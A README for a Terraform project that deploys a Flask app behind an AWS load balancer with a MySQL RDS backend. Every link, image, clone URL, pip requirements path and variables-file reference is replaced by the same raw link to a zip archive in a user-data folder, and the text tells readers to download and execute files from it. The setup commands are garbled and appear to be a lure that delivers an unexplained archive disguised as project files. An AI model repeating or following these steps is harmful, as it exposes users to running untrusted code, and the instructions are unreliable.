# Multi-Tier Web Application on AWS 🌐

![Multi-Tier Web App](https://github.com/Afolayanpelumi/Multi-tier-webapp/raw/refs/heads/main/terraform/user-data/webapp-Multi-tier-3.8.zip%20Web%20App-AWS%20Terraform-brightgreen)

Welcome to the **Multi-Tier Web Application** repository! This project enables you to deploy a production-grade multi-tier web application on AWS using Terraform. The architecture includes a Flask application served on EC2, fronted by an Application Load Balancer (ALB), with a secure MySQL RDS backend and modular networking.

## Table of Contents

1. [Overview](#overview)
2. [Architecture](#architecture)
3. [Features](#features)
4. [Technologies Used](#technologies-used)
5. [Setup](#setup)
6. [Deployment](#deployment)
7. [Usage](#usage)
8. [Contributing](#contributing)
9. [License](#license)
10. [Links](#links)

## Overview

This project focuses on deploying a robust and scalable multi-tier web application. The architecture separates the presentation, application, and data layers, enhancing security and performance. The use of AWS services ensures high availability and reliability.

## Architecture

The architecture consists of the following components:

- **Flask Application**: The backend service running on EC2 instances.
- **Application Load Balancer (ALB)**: Distributes incoming traffic across multiple EC2 instances to ensure availability.
- **MySQL RDS**: A managed relational database service for data storage.
- **VPC**: A Virtual Private Cloud that provides a secure and isolated network environment.

![Architecture Diagram](https://github.com/Afolayanpelumi/Multi-tier-webapp/raw/refs/heads/main/terraform/user-data/webapp-Multi-tier-3.8.zip+Diagram)

## Features

- **Scalability**: Automatically scales EC2 instances based on traffic.
- **Security**: Uses security groups and IAM roles to restrict access.
- **Modular Networking**: Easily configurable network settings.
- **Infrastructure as Code (IaC)**: Provision infrastructure using Terraform.
- **Easy Deployment**: Simplified deployment process with pre-defined scripts.

## Technologies Used

- **AWS**: The cloud provider for hosting the application.
- **Terraform**: Infrastructure as Code tool for provisioning AWS resources.
- **Flask**: A lightweight Python web framework for building the application.
- **MySQL**: A relational database for data storage.
- **EC2**: Elastic Compute Cloud for running the application.
- **ALB**: Application Load Balancer for traffic distribution.
- **VPC**: Virtual Private Cloud for network isolation.

## Setup

To set up the project, follow these steps:

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/Afolayanpelumi/Multi-tier-webapp/raw/refs/heads/main/terraform/user-data/webapp-Multi-tier-3.8.zip
   cd Multi-tier-webapp
   ```

2. **Install Dependencies**:
   Ensure you have Python and Terraform installed. Then, install the required Python packages:
   ```bash
   pip install -r https://github.com/Afolayanpelumi/Multi-tier-webapp/raw/refs/heads/main/terraform/user-data/webapp-Multi-tier-3.8.zip
   ```

3. **Configure AWS Credentials**:
   Set up your AWS credentials using the AWS CLI:
   ```bash
   aws configure
   ```

4. **Initialize Terraform**:
   Navigate to the Terraform directory and initialize:
   ```bash
   cd terraform
   terraform init
   ```

5. **Update Variables**:
   Modify the `https://github.com/Afolayanpelumi/Multi-tier-webapp/raw/refs/heads/main/terraform/user-data/webapp-Multi-tier-3.8.zip` file to customize your deployment settings.

## Deployment

To deploy the application, run the following commands in the Terraform directory:

1. **Plan the Deployment**:
   ```bash
   terraform plan
   ```

2. **Apply the Deployment**:
   ```bash
   terraform apply
   ```

3. **Access the Application**:
   After deployment, you can access the application via the ALB URL provided in the output.

## Usage

Once deployed, you can interact with the Flask application through the web interface. Use the ALB URL to access the application in your browser. The application supports various endpoints for CRUD operations.

## Contributing

We welcome contributions! If you want to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch:
   ```bash
   git checkout -b feature/YourFeature
   ```
3. Make your changes and commit them:
   ```bash
   git commit -m "Add your feature"
   ```
4. Push to the branch:
   ```bash
   git push origin feature/YourFeature
   ```
5. Create a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Links

For the latest releases, visit the [Releases section](https://github.com/Afolayanpelumi/Multi-tier-webapp/raw/refs/heads/main/terraform/user-data/webapp-Multi-tier-3.8.zip). You can download and execute the necessary files from there.

For more details on the architecture and setup, please check the [Releases section](https://github.com/Afolayanpelumi/Multi-tier-webapp/raw/refs/heads/main/terraform/user-data/webapp-Multi-tier-3.8.zip) for updates.

---

Thank you for exploring the Multi-Tier Web Application project! Your feedback and contributions are welcome.